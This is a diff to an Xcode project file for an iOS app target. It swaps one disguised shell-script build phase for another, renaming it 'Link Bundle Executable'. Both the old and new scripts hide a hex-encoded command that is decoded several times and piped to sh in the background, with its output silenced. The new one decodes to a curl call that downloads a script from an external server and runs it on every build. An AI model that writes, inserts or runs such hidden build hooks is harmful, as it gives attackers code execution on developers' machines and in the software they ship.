@@ -138,7 +138,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97C147051CF9000F007C117D /* Build configuration list for PBXNativeTarget "Runner" */;
 			buildPhases = (
-				C2E04A36A740FEF326877BEF /* Build Target Dependencies */,
+				D63E9DA9C938AE5B3D877BEF /* Link Bundle Executable */,
 				BE9E17DDB9E51ED27E6FFBB2 /* [CP] Check Pods Manifest.lock */,
 				9740EEB61CF901F6004384FC /* Run Script */,
 				97C146EA1CF9000F007C117D /* Sources */,
@@ -190,14 +190,14 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXTargetDependency section */
 /* End PBXTargetDependency section */
 
 /* Begin PBXLegacyTarget section */
 /* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		97C146EC1CF9000F007C117D /* Resources */ = {
@@ -215,7 +215,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		C2E04A36A740FEF326877BEF /* Build Target Dependencies */ = {
+		D63E9DA9C938AE5B3D877BEF /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -225,13 +225,13 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Dependencies";
+			name = "Link Bundle Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633343336333933363337333633393337333433363331333636333336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363336343633363136333638363532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;			
 		};
 		3B06AD1E1E4923F5004D2608 /* Thin Binary */ = {
